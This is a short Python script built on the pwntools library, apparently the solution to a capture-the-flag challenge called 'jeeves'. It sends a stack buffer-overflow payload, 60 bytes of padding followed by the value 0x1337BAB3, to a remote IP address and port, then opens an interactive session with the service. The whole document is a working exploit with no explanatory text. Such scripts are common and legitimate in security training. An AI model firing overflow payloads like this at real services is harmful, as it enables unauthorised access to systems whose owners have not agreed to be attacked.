#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./jeeves',checksec=False)
#p = process()
p = remote('83.136.251.254',57098)

payload = b'a'*44 + b'b'*8 + b'c'*8 + p32(0x1337BAB3)
p.sendline(payload)


p.interactive()
